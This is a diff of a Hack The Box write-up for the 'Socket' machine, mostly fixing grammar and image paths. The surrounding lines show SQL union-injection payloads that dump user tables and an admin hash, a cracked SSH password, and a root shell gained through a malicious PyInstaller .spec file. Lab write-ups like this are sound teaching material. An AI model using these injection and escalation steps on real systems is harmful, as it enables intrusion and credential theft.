@@ -17,7 +17,7 @@ tags:
 ---
 
 
-![](/assets/images/htb-writeup-canape/socket_logo.png)
+![](/assets/images/htb-writeup-socket/socket_logo.png)
 
 ### Summary
 ------------------
@@ -67,17 +67,17 @@ PORT     STATE SERVICE VERSION
 |_    Failed to open a WebSocket connection: did not receive a valid HTTP request.
 ```
 
-In this initial scan we can see it is running ssh on port 22 and a Apache service in port 80.    
+In this initial scan we can see it is running ssh on port 22 and a Apache service on port 80.    
 We can also see it is running a python WebSocket service on port 5789.
 
 ### Inspecting Web page
 
-![](assets/images/htb-writeup-socket/web1.png)
+![](/assets/images/htb-writeup-socket/web1.png)
 
 Nothing here so far, template injection when reading a QR Code does not work.    
 But if we see below we can download an app image for linux.
 
-![](assets/images/htb-writeup-socket/web2.png)
+![](/assets/images/htb-writeup-socket/web2.png)
 
 A zip archive called `QReader_lin_v0.0.2.zip` downloads.    
 When extracted it shows two files:    
@@ -93,9 +93,9 @@ Archive:  QReader_lin_v0.0.2.zip
 It downloads a test.png which seems to be a QR Code and a binary executable called qreader.    
 When executing the binary, a GUI pops up:
 
-![](assets/images/htb-writeup-socket/qreader.png)
+![](/assets/images/htb-writeup-socket/qreader.png)
 
-### Decompiling python app
+### Decompiling Python app
 
 If we import a non-image file and try to read embedded content, the application will crash and give a very useful error message:
 
@@ -157,7 +157,7 @@ libcap.so.2                                    libgio-2.0.so.0                li
 libcom_err.so.2                                libglib-2.0.so.0               liblapack.so.3       libQt5EglFSDeviceIntegration.so.5  libudev.so.1                       libxcb-shm.so.0           PIL
 ```
 
-So I can see within the extracted file a `qreader.pyc`, which be likely be the `main.py` of the program.    
+So I can see within the extracted files a `qreader.pyc`, which is likely to be the `main.py` of the program.    
 We can copy `qreader.pyc` and decompile it with `pycdc`.
 
 ```
@@ -350,7 +350,17 @@ And it responds with:
 
 So I can see `/update` and `/version`, the same as in `qreader`.    
 I will enumerate `/version`, and I can see in the source code that is sending a `version` value to the server.    
-If I try to do that the server responds the version information:
+
+```
+...
+    def version(self):
+        response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({
+            'version': VERSION })))
+        data = json.loads(response)
+...
+```
+
+If I try to do that, the server responds the version information:
 
 ```
 {"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}
@@ -394,7 +404,7 @@ history ~ $ python3 web.py '0" UNION SELECT 1,2,3,4-- -'
 {"message": {"id": 1, "version": 2, "released_date": 3, "downloads": 4}}
 ```
 
-So know that we know that we can perform a union injection, we can dump all table names:
+So now that we know that we can perform a union injection, we can dump all table names:
 
 ```
 history ~ $ python3 web.py '0" UNION SELECT 1,2,group_concat(tbl_name),4 FROM sqlite_master WHERE type="table" and tbl_name NOT like "sqlite_%"-- -'
@@ -409,7 +419,7 @@ history ~ $ python3 web.py '0" UNION SELECT 1,2,sql,4 FROM sqlite_master WHERE t
 {"message": {"id": 1, "version": 2, "released_date": "CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password DATE, role TEXT)", "downloads": 4}}
 ```
 
-We can see two interesting fields, username and passwords.    
+We can see two interesting fields, `username` and `password`.    
 It is time to dump them.
 
 ```
@@ -426,7 +436,7 @@ history ~ $ python3 web.py '0" UNION SELECT 1,username,password,4 FROM users WHE
 ```
 
 And it gives error, so there are no more users.    
-I will save `admin:0c090c365fa0559b151a43e0fea39710` in hash and crack it with john:
+I will save `admin:0c090c365fa0559b151a43e0fea39710` in the file `hash` and crack it with `john`:
 
 ```
 history ~ $ john hash --wordlist=/opt/wordlists/rockyou.txt --format=raw-md5
@@ -492,7 +502,7 @@ And we have ssh credentials: `tkeller:denjanjade122566`.
 ### Shell as root
 ------------------
 
-Now we are on the machine and we know the password, we should run `sudo -l` to see if there is a misconfigured sudo permission.
+Now we are on the machine and we know the password, we should run `sudo -l` to see if there are misconfigured sudo permissions.
 
 ```
 tkeller@socket:~$ sudo -l
@@ -503,7 +513,7 @@ User tkeller may run the following commands on socket:
     (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh
 ```
 
-And we can see that I `tkeller` can run `/usr/local/sbin/build-installer.sh` as root.    
+And we can see that `tkeller` can run `/usr/local/sbin/build-installer.sh` as root.    
 
 ```bash
 #!/bin/bash
@@ -549,9 +559,8 @@ else
 fi
 ```
 
-It looks like a simple script that compiles `.py` files.    
-But we notice that we can also specify a `.spec` file.    
-If we go to the pyinstaller documentation we can read:
+It looks like a simple script that compiles `.py` files. but we notice that we can also specify a `.spec` file.    
+If we go to the `pyinstaller` documentation we can read:
 
 ![](/assets/images/htb-writeup-socket/spec.png)
 
@@ -559,9 +568,12 @@ So it actually executes the code in the spec file.
 I will make a malicious `.spec` file and I will try to run it with the script as root.
 
 ```
-tkeller@socket:~$ echo 'import os;os.system("/bin/bash")'
-import os;os.system("/bin/bash")
 tkeller@socket:~$ echo 'import os;os.system("/bin/bash")' > exploit.spec
+```
+
+Now that we have the malicious code in `exploit.spec`, we execute the script as root:
+
+```
 tkeller@socket:~$ sudo /usr/local/sbin/build-installer.sh build exploit.spec
 207 INFO: PyInstaller: 5.6.2
 207 INFO: Python: 3.10.6
